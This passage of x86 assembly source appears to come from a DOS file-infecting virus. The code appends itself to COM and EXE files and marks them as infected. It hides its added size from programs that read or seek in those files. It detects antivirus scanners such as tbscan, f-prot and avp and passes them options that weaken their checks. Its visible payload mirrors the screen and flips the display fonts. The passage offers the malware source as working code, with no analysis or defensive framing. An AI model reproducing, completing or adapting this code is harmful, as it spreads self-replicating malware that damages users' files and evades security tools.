                jbe     read_all
                mov     cx,ax
read_all:       mov     dx,ds:dos_dx
                add     dx,ds:dos_ax
                push    ds:dos_flags
                popf
                mov     ds,ds:dos_ds
                mov     ah,3fh
                call    dos21
                pushf
                pop     cs:dos_flags
                jnc     read_ok
                and     word ptr cs:dos_ax,0
read_ok:        add     cs:dos_ax,ax
                jmp     load_regs_retf

dosf_40:        call    handle_infected?
                jne     dosf_40_exit
                jc      dosf_40_exit
                call    floopy_write_protected?
                jc      dosf_40_exit
                call    get_seek_point
                push    ax dx
                call    seek_to_head
                mov     ah,40h
                mov     cx,18h
                mov     dx,offset new_header
                call    access
                jc      dosf_40_exit_
                les     dx,dword ptr ds:host_size
                mov     cx,es
                call    seek_from_head
                mov     ah,40h
                xor     cx,cx
                call    dos21
                jc      dosf_40_exit_
                mov     ds:dosf_3e_handle,bx
dosf_40_exit_:  pop     cx dx
                call    seek_from_head
dosf_40_exit:   ret

dosf_42:        call    stealth?
                cmp     al,2
                jne     dosf_42_exit
                call    handle_infected?
                jne     dosf_42_exit
                jc      dosf_42_exit
                les     dx,dword ptr ds:host_size
                mov     cx,es
                call    seek_from_head
                mov     byte ptr ds:dos_ax,1
dosf_42_exit:   ret

dosf_4b:        cmp     al,1
                ja      dosf_42_exit
                je      already_move
                mov     ax,cs
                cmp     ax,7c00h
                jne     already_move
                call    move
already_move:   call    exe_or_com?
                jne     dosf_4b00_4b01
                call    comp_av_name
                jne     dosf_4b00_4b01
                push    ax
                call    load_regs
                pop     dx
                les     bx,es:pcb_parameter_ptr[bx]
                call    move_av_command

dosf_4b00_4b01: call    load_regs
                or      al,al
                jz      infect_file
                call    infect_file
                call    load_regs
                call    file_infected?
                jne     dosf_4b01_exit
                jc      dosf_4b01_exit
                call    load_regs
                push    bx es
                call    dos21
                call    save_regs
                pop     es di
                jc      load_regs_retf_

                mov     si,offset new_header
                push    cs
                pop     ds
                cld
                call    check_mz
                je      dosf_4b01_exe
                les     di,dword ptr es:pcb_ip[di]
                movsb
                movsw
                jmp     load_regs_retf_
dosf_4b01_exit: ret

dosf_4b01_exe:  mov     ah,51h
                call    dos21
                mov     bp,bx
                add     di,pcb_sp
                lds     bx,es:[di]
                mov     cx,ds:[bx]
                push    cs
                pop     ds
                mov     ax,ds:eh_sp[si]
                dec     ax
                dec     ax
                stosw
                xchg    bx,ax
                lea     ax,[bp+10h]
                push    ax
                add     ax,ds:eh_ss[si]
                stosw
                mov     ds,ax
                mov     ds:[bx],cx
                push    cs
                pop     ds
                mov     ax,ds:eh_ip[si]
                stosw
                pop     ax
                add     ax,ds:eh_cs[si]
                stosw
load_regs_retf_:jmp     load_regs_retf

dosf_3d:        test    al,1
                jz      infect_file
                xor     al,11b
                mov     byte ptr cs:dos_ax,al
dosf_43_56:
infect_file:    call    exe_or_com?
                jne     dosf_4b_exit
                call    file_infected?
                jbe     dosf_4b_exit
                call    floopy_write_protected?
                jc      dosf_4b_exit
                call    load_regs
                mov     ax,4300h
                call    dos21
                jc      dosf_4b_exit
                test    cl,11100b
                jnz     dosf_4b_exit
                mov     cs:file_attr,cx
                mov     ax,4301h
                and     cl,0feh
                call    dos21
                jc      dosf_4b_exit
                call    infect_exe_com
                call    load_regs
                mov     ax,4301h
                mov     cx,0
file_attr       =       word ptr $-2
                call    dos21
dosf_4b_exit:   ret

infect_exe_com: mov     ax,3d02h
infect_handle:  call    dos21
                jc      infect_exe_com_ret
                xchg    bx,ax
                mov     ax,5700h
                call    dos21
                push    cs cs
                pop     ds es
                mov     ds:file_time,cx
                mov     ds:file_date,dx
                mov     ah,3fh
                mov     cx,18h+4
                mov     dx,offset new_header
                call    access
                jc      dosf_4b_close
                mov     ds:host_select_jmp,al
                mov     si,dx
                call    floopy_write_protected?
                jc      dosf_4b_close
                mov     di,offset host_header
                sub     cx,4
                cld
                rep     movsb
                call    get_file_size
                mov     ds:host_size,ax
                mov     ds:host_size[2],dx
                call    check_mz
                je      modify_exe

modify_com:     or      dx,dx
                jnz     dosf_4b_close
                cmp     ax,0ffffh-stack_size-vir_size
                ja      dosf_4b_close
                mov     byte ptr ds:[di],0e9h
                sub     ax,3
                mov     ds:[di+1],ax
                jmp     write_me

dosf_4b_close:  mov     ah,3eh
                call    dos21
infect_exe_com_ret:
                ret

modify_exe:     mov     bp,10h
                cmp     dx,bp
                jae     dosf_4b_close
                call    calc_sect_mod
                sub     ax,ds:eh_sects[di]
                jnz     dosf_4b_close
                sub     dx,ds:eh_sect_mod[di]
                jnz     dosf_4b_close
                mov     cx,ds:eh_max_mem_para[di]
                jcxz    dosf_4b_close
                inc     cx
                jz      max_mem_ok
                sub     word ptr ds:eh_max_mem_para[di],vir_para_size
                jbe     dosf_4b_close
max_mem_ok:     cmp     ax,ds:eh_ovl_num[di]
                jne     dosf_4b_close
                mov     ax,ds:eh_1st_rel[di]
                cmp     ax,40h
                jb      not_windows_ne
                cmp     ax,52h
                jne     dosf_4b_close
not_windows_ne: les     cx,dword ptr ds:eh_ip[di]
                mov     ax,es
                cmp     ax,ds:eh_ss[di]
                je      dosf_4b_close
                add     ax,ds:eh_header_para[di]
                imul    bp
                add     ax,cx
                adc     dx,0
                sub     ax,2
                sbb     dx,0
                mov     cx,dx
                xchg    dx,ax
                call    seek_from_head
                mov     ah,3fh
                mov     cx,2
                mov     dx,offset packed_sign
                call    access
                jc      dosf_4b_close
                cmp     word ptr ds:packed_sign,'BR'
                je      dosf_4b_close

                call    get_file_size
                add     ax,vir_size+7fh
                adc     dx,cx
                and     al,not 7fh
                add     ax,6
                adc     dx,cx
                call    calc_sect_mod
                mov     ds:eh_sects[di],ax
                mov     ds:eh_sect_mod[di],dx

                call    get_file_size
                div     bp
                sub     ax,ds:eh_header_para[di]
                mov     ds:eh_ip[di],dx
                mov     ds:eh_cs[di],ax
                mov     ds:eh_sp[di],(vir_size+stack_size-10h) and 0fffeh
                inc     ax
                mov     ds:eh_ss[di],ax

                mov     byte ptr ds:host_select_jmp,exe_host-host_select_jmp-1

write_me:       call    seek_to_end
                mov     ah,40h
                mov     cx,vir_size
                cwd
                call    access
                jc      dosf_4b_close_
                call    seek_to_head
                mov     ah,40h
                mov     cx,18h
                mov     dx,offset new_header
                call    access
                jc      dosf_4b_close_
                call    get_file_size
                add     ax,7fh
                adc     dx,0
                and     al,not 7fh
                mov     cx,dx
                xchg    dx,ax
                call    seek_from_head
                mov     word ptr ds:vir_mark,'DS'
                mov     ah,40h
                mov     cx,6
                mov     dx,offset vir_mark
                call    access
dosf_4b_close_: mov     ax,5701h
                mov     cx,0
file_time       =       word ptr $-2
                mov     dx,0
file_date       =       word ptr $-2
                call    dos21
                jmp     dosf_4b_close

calc_sect_mod:  mov     cx,512
                div     cx
                or      dx,dx
                jz      $+3
                inc     ax
                ret

check_mz:       cmp     word ptr ds:new_header,'ZM'
                je      its_exe
                cmp     word ptr ds:new_header,'MZ'
its_exe:        ret

move:           mov     ax,5800h
                call    dos21
                push    ax
                mov     ax,5801h
                push    ax
                mov     bx,80h
                call    dos21
                mov     ax,5802h
                call    dos21
                xor     ah,ah
                push    ax
                mov     ax,5803h
                push    ax
                mov     bl,1
                call    dos21
                mov     ah,48h
                mov     bx,mem_para_size-1
                cmp     byte ptr cs:active_flag,0
                je      alloc_mem
                inc     bh
alloc_mem:      call    dos21
                dec     ax
                xchg    bp,ax
                xor     si,si
                mov     ah,52h
                call    dos21
                mov     ax,es:[bx-2]
search_mcb:     mov     ds,ax
                add     ax,ds:mcb_para_size[si]
                inc     ax
                cmp     ax,bp
                jne     search_mcb
                mov     es,ax
                mov     ax,es:mcb_para_size[si]
                inc     ax
                add     ds:mcb_para_size[si],ax
                xor     di,di
                mov     cx,mem_size
                cld
                rep     movs byte ptr es:[di],cs:[si]
                mov     ds,cx
                mov     ds:[4f1h+3],es
                mov     ds:[4f1h+3+5],es
                mov     ds:[4f1h+3+5+5],es
                pop     ax
                pop     bx
                call    dos21
                pop     ax
                pop     bx
                call    dos21
                push    es
                mov     ax,offset read_bios_fonts
                push    ax
                retf
read_bios_fonts:cmp     byte ptr cs:active_flag,0
                je      move_done
                mov     ax,1130h
                mov     bh,6
                int     10h
                mov     si,bp
                push    es
                pop     ds
                mov     di,offset fonts_buffer+15
                push    cs
                pop     es
                mov     cx,256
modify_fonts:   mov     dx,16
modify_1font:   lodsb
                xor     ah,ah
                mov     bl,8
modify_8bit:    shr     al,1
                rcl     ah,1
                dec     bl
                jnz     modify_8bit
                mov     es:[di],ah
                dec     di
                dec     dx
                jnz     modify_1font
                add     di,17+15
                loop    modify_fonts
                push    cs
                pop     ds
                mov     al,10h
                call    get_int
                mov     ds:old10,bx
                mov     ds:old10[2],es
                mov     dx,offset int10
                call    set_int
                call    set_bios_fonts
                mov     al,1ch
                mov     dx,offset int1c
                call    set_int
move_done:      jmp     load_regs

set_bios_fonts: mov     ax,1100h
                mov     bx,256*16
                mov     cx,256
                cwd
                mov     bp,offset fonts_buffer
                push    cs
                pop     es
bios10:         pushf
                cli
                push    cs
                call    jmp_int10
                ret

int10:          or      ah,ah
                jnz     jmp_int10
                push    ax
                mov     byte ptr cs:int1c,0cfh
                and     al,7fh
                cmp     al,3
                ja      int10_exit
                cmp     al,2
                jb      int10_exit
                pop     ax
                call    bios10
                push    ax bx cx dx bp es
                call    set_bios_fonts
                pop     es bp dx cx bx ax
                mov     byte ptr cs:int1c,90h
                iret
int10_exit:     pop     ax
jmp_int10:      db      0eah
old10           dw      ?,?

int1c:          nop
                push    ax cx dx si di ds es
                mov     dx,3d4h
                mov     ax,100ch
                out     dx,ax
                mov     ax,0dh
                out     dx,ax
                xor     si,si
                mov     ax,0b800h
                mov     ds,ax
                mov     di,80*25*2-2
                mov     ah,0bah
                mov     es,ax
                mov     cx,80*25*2/2
                cld
move_word:      movsw
                sub     di,4
                loop    move_word
                pop     es ds di si dx cx ax
                iret

exe_or_com?:    mov     si,dx           ; ds:dx = file name
exe_or_com?_:                           ; ds:si = file name
find_zero:      lodsb
                or      al,al
                jnz     find_zero
                sub     si,5
                jb      eoc?_exit
                mov     ax,ds:[si]
                mov     bx,ds:[si+2]
                cmp     al,'.'
                jne     eoc?_exit
                or      ah,20h
                or      bx,2020h
                cmp     ah,'c'
                jne     is_exe?
                cmp     bx,'mo'
                je      eoc?_exit
is_exe?:        cmp     ah,bh
                jne     eoc?_exit
                cmp     bx,'ex'
eoc?_exit:      ret

floopy_write_protected?:
                mov     al,0
device_info     =       byte ptr $-1
                test    al,111110b
                jnz     not_floopy
floopy_write_protected?_:
                push    dx
                mov     dx,3f5h
                mov     al,4
                out     dx,al
                mov     ch,4
                loop    $
                out     dx,al
                mov     ch,4
                loop    $
                in      al,dx
                test    al,40h
                pop     dx
                jz      not_floopy
                stc
not_floopy:     ret

file_infected?: mov     ax,3d00h
                call    dos21
                jc      fi?_exit
                xchg    bx,ax
                call    handle_infected?
                pushf
                mov     ah,3eh
                call    dos21
                popf
fi?_exit:       ret

handle_infected?:
                push    cs
                pop     ds
                mov     ax,4400h
                mov     ds:vir_mark,ax
                call    dos21
                jc      hi?_end
                or      al,al
                stc
                js      hi?_end
                mov     ds:device_info,al
                call    get_seek_point
                push    ax dx
                call    get_file_size
                sub     al,6
                test    al,7fh
                jnz     rest_seek_point
                mov     cx,-1
                mov     dx,-6
                call    seek_from_end
                mov     ah,3fh
                mov     cx,6
                mov     dx,offset vir_mark
                call    access
                jc      rest_seek_point
                cmp     word ptr ds:vir_mark,'DS'
                clc
                jne     rest_seek_point
                les     dx,dword ptr ds:host_size
                mov     cx,es
                add     dx,vir_size-18h
                adc     cx,0
                call    seek_from_head
                mov     ah,3fh
                mov     cx,18h
                mov     dx,offset new_header
                call    access
rest_seek_point:pop     cx dx
                pushf
                call    seek_from_head
                popf
hi?_end:        ret

seek_to_head:   mov     al,0
                cmp     ax,0
                org     $-2
get_seek_point: mov     al,1
                cmp     ax,0
                org     $-2
seek_to_end:
get_file_size:  mov     al,2
                xor     cx,cx
                xor     dx,dx
                cmp     ax,0
                org     $-2
seek_from_head: mov     al,0
                cmp     ax,0
                org     $-2
seek_from_now:  mov     al,1
                cmp     ax,0
                org     $-2
seek_from_end:  mov     al,2
seek:           mov     ah,42h
                call    dos21
                ret

access:         call    dos21
                jc      access_ret
                sub     ax,cx
access_ret:     ret

set_int24:      in      al,21h
                or      al,2
                out     21h,al
                mov     al,24h
                call    get_int
                cmp     bx,offset int24
                je      set_int24_exit
                push    cs
                pop     ds
                mov     ds:old24,bx
                mov     ds:old24[2],es
                mov     dx,offset int24
                jmp     set_int
set_int24_exit: ret

unset_int24:    in      al,21h
                and     al,not 2
                out     21h,al
                mov     al,24h
                call    get_int
                cmp     bx,offset int24
                jne     unset_int24_exit
                lds     dx,dword ptr cs:old24
                jmp     set_int
unset_int24_exit:
                ret

int24:          mov     al,3
                iret

int2f:          cmp     ax,1216h
                jne     int2f_exit
                stc
                retf    2
int2f_exit:     db      0eah
old2f           dw      ?,?

chrn            db      50h,0,01,2
                db      50h,0,02,2
                db      50h,0,03,2
                db      50h,0,04,2
                db      50h,0,05,2
                db      50h,0,06,2
                db      50h,0,07,2
                db      50h,0,08,2
                db      50h,0,09,2
                db      50h,0,10,2

dbbw            macro   a,b,c
                db      a
                db      b
                dw      c
                endm

av_name:        dbbw    4,'vtsc',vt_cmd
                dbbw    4,'vthu',vt_cmd
                dbbw    4,'pvsc',vt_cmd
                dbbw    4,'pvcl',vt_cmd
                dbbw    7,'tbscan.',tb_cmd
                dbbw    4,'f-pr',fp_scan_cmd
                dbbw    5,'scan.',fp_scan_cmd
                dbbw    3,'avp',avp_cmd
                db      0

vt_cmd          db      '/i',0dh
tb_cmd          db      'co nm',0dh
fp_scan_cmd     db      '/nomem',0dh
avp_cmd         db      '/m',0dh

helper_name     db      5,'PKZIP'
                db      3,'ARJ'
                db      3,'RAR'
                db      3,'LHA'
                db      5,'TELIX'
                db      6,'BACKUP'
                db      8,'MSBACKUP'
                db      8,'CPBACKUP'
                db      6,'CHKDSK'
                db      0

host_header     db      0cdh,20h,16h dup(?)
vir_end:
new_header      db      18h+4 dup(?)

vir_mark        dw      ?
host_size       dw      ?,?

active_flag     db      ?

old24           dw      ?,?

packed_sign     dw      ?
file_name       db      15 dup(?)
disk_buffer     db      512 dup(?)
mem_end:
fonts_buffer    db      1000h dup(?)

sft             struc
sft_users       dw      ?
sft_mode        dw      ?
sft_attr        db      ?
sft_dev_attr    dw      ?
sft_dpb_ptr     dd      ?
sft_1st_clust   dw      ?
sft_time        dw      ?
sft_date        dw      ?
sft_size        dd      ?
sft_seek_point  dd      ?
sft_rel_clust   dw      ?
sft_abs_clust   dw      ?
sft_dir_sect    dw      ?
sft_dir_entries db      ?
sft_name        db      8 dup(?)
sft_ext         db      3 dup(?)
sft_shr_sft_ptr dd      ?
sft_shr_mchn_num dw     ?
sft_psp_seg     dw      ?
sft_shr_rec_ofs dw      ?
sft_last_rw_clust_no dw ?
sft             ends

exe_header      struc
eh_sign         dw      ?
eh_sect_mod     dw      ?
eh_sects        dw      ?
eh_rels         dw      ?
eh_header_para  dw      ?
eh_min_mem_para dw      ?
eh_max_mem_para dw      ?
eh_ss           dw      ?
eh_sp           dw      ?
eh_checksum     dw      ?
eh_ip           dw      ?
eh_cs           dw      ?
eh_1st_rel      dw      ?
eh_ovl_num      dw      ?
                db      32 dup(?)
eh_neh_ofs      dd      ?
exe_header      ends

new_exe_header  struc
neh_sign        dw      ?
neh_linker_ver  dw      ?
neh_entry_tb_ofs dw     ?
neh_entry_tb_size dw    ?
neh_crc         dd      ?
neh_prog_flags  db      ?
neh_app_flags   db      ?
neh_auto_data_seg_index dw ?
neh_init_loc_heap_size dw ?
neh_init_stack_size dw  ?
neh_ip          dw      ?
neh_cs          dw      ?
neh_sp          dw      ?
neh_ss          dw      ?
neh_seg_count   dw      ?
neh_mod_ref_count dw    ?
neh_nresid_name_size dw ?
neh_seg_tb_ofs  dw      ?
neh_resrc_tb_ofs dw     ?
neh_resid_name_tb_ofs dw ?
neh_mod_ref_ofs dw      ?
neh_import_name_tb_ofs dw ?
neh_nresid_name_tb_ofs dd ?
neh_movable_entry_count dw ?
neh_align_shift dw      ?
neh_resrc_tb_entry_count dw ?
neh_opert_system db     ?
neg_exe_flags   db      ?
neg_ret_thunk_ofs dw    ?
neh_seg_ref_thunk_ofs dw ?
neh_mini_code_swap_size dw ?
neh_expect_win_ver dw   ?
new_exe_header  ends

sys_header      struc
sh_next_ptr     dd      ?
sh_attr         dw      ?
sh_strat        dw      ?
sh_int          dw      ?
sh_name         db      8 dup(?)
sys_header      ends

dos_caller_stack struc
dcs_ax          dw      ?
dcs_bx          dw      ?
dcs_cx          dw      ?
dcs_dx          dw      ?
dcs_si          dw      ?
dcs_di          dw      ?
dcs_bp          dw      ?
dcs_ds          dw      ?
dcs_es          dw      ?
dcs_ip          dw      ?
dcs_cs          dw      ?
dcs_flags       dw      ?
dos_caller_stack ends

dir             struc
dir_drive       db      ?
dir_name        db      8 dup(?)
dir_ext         db      3 dup(?)
dir_attr        db      ?
                db      10 dup(?)
dir_time        dw      ?
dir_date        dw      ?
dir_start_clust dw      ?
dir_size        dd      ?
dir             ends

find            struc
find_drive      db      ?
find_find_name  db      8 dup(?)
find_find_ext   db      3 dup(?)
find_find_attr  db      ?
find_entry_count dw     ?
find_dir_1st_clust dw   ?
                db      4 dup(?)
find_attr       db      ?
find_time       dw      ?
find_date       dw      ?
find_size       dd      ?
find_name       db      13 dup(?)
find            ends

mcb             struc
mcb_sign        db      ?
mcb_onwer_seg   dw      ?
mcb_para_size   dw      ?
                db      3 dup(?)
mcb_name        db      8 dup(?)
mcb             ends

pcb             struc
pcb_env_var_seg dw      ?
pcb_parameter_ptr dd    ?
pcb_fcb1_ptr    dd      ?
pcb_fcb2_ptr    dd      ?
pcb_sp          dw      ?
pcb_ss          dw      ?
pcb_ip          dw      ?
pcb_cs          dw      ?
pcb             ends


boot_sector     struc
bs_jmp          db      3 dup(?)
bs_oem_name     db      8 dup(?)
bs_sector_size  dw      ?
bs_clust_sectors db     ?
bs_reserved_sectors dw  ?
bs_fat_count    db      ?
bs_root_dir_entries dw  ?
bs_sectors      dw      ?
bs_media_id     db      ?
bs_fat_sectors  dw      ?
bs_track_sectors dw     ?
bs_heads        dw      ?
bs_hidden_sectors dd    ?
bs_ext_sectors  dd      ?
bs_drive_count  db      ?
                db      ?
bs_boot_sign    db      ?
bs_id           dd      ?
bs_label        db      11 dup(?)
bs_fat_type     db      8 dup(?)
boot_sector     ends

partition_table struc
pt_active_id    db      ?
pt_boot_head    db      ?
pt_boot_sector  db      ?
pt_boot_track   db      ?
pt_system_id    db      ?
pt_last_head    db      ?
pt_last_sector  db      ?
pt_last_track   db      ?
pt_first_sect_no dd     ?
pt_sectors      dd      ?
partition_table ends

                end     start
